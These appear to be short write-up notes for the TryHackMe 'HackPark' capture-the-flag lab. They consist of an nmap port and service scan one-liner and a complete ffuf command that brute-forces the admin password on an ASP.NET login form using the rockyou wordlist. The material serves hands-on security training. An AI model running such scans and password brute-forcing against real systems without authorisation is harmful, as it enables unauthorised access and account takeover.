https://tryhackme.com/room/hackpark

NMAP output
```sh
nmap -p$(nmap -p- -Pn --min-rate=1000 -T4 $TARGET | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sV -Pn $TARGET -oA ${TARGET}
```
![image](https://github.com/user-attachments/assets/a781870e-2ffa-454f-bd5b-7792f3300454)



```sh
ffuf -w /usr/share/wordlists/rockyou.txt:PASS -X POST -H 'Content-Type: application/x-www-form-urlencoded' -u http://10.10.229.207/Account/login.aspx -d "__VIEWSTATE=xWW6LEUJUAbMvWoBsTu6MxMpxRO3n5AABE2qkSsKEa8yFYCGtNCvko6lyTJ5uZpFZ4KTk%2B4CMO7LFR3ei3hNmvEom07ZFk%2BFcjrqmMgQf%2BfIEpevKy2KMbD%2FDvpXDZ52B5X3uVQbmPST%2FDp0%2FZ0szQyTfM%2FZKdDDFpeVRDzp7q%2BJnp6G&__EVENTVALIDATION=qv0ciJ8OHhjjvfo8EEqYPplcg0xPXz%2Bj0h%2FllQShHP%2BoZ8%2BFinRBW7VcQAuCulujsQQ7%2BkTnmaekR%2BpeWC8jelKGahf6J3V%2B2%2FK86ej0iK1PFvS3JSq3Lc6BLYpgIm7W%2BET2jl%2BXV2TPA9aQUUNDCx3PHMNrtgz9CdJMcRRCCmhS6NyR&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=PASS&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in" -fw 786
```
